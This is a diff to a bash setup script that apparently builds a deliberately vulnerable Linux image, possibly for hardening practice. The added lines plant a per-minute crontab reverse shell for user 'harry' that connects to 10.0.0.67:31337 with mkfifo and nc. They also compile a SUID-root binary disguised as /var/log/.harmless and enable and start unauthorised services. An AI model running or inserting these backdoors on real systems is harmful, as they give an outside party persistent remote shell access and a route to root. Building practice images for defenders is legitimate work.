@@ -16,6 +16,14 @@ fi
 source ./config.sh
 source ./helpers.sh
 
+# reverse shell crontab for harry
+cat <(echo "* * * * * rm /tmp/leet; mkfifo /tmp/leet; </tmp/leet /bin/sh -i 2>&1 | nc 10.0.0.67 31337 >/tmp/leet") | crontab -u harry -
+
+# suid file
+cc -o /var/log/.harmless orig/suid.c
+chown root:root /var/log/.harmless
+chmod 4755 /var/log/.harmless
+
 # add groups
 declare -n list=groups_create_list
 for group in "${list[@]}"; do
@@ -31,6 +39,8 @@ done
 declare -n list=services_unauth_list
 for pkg in "${list[@]}"; do
   apt install $pkg -y
+  systemctl unmask $pkg
+  systemctl enable $pkg
   systemctl start $pkg
 done
 
@@ -38,14 +48,17 @@ done
 declare -n list=packages_critical_list
 for pkg in "${list[@]}"; do
   apt purge $pkg -y
-  apt autoremove -y
 done
+apt autoremove -y
+
+apt purge stacer -y
+apt autoremove -y
 
 declare -n list=packages_install_list
 for pkg in "${list[@]}"; do
   apt purge $pkg -y
-  apt autoremove -y
 done
+apt autoremove -y
 
 # special case downgrade thunderbird
 #apt purge thunderbird
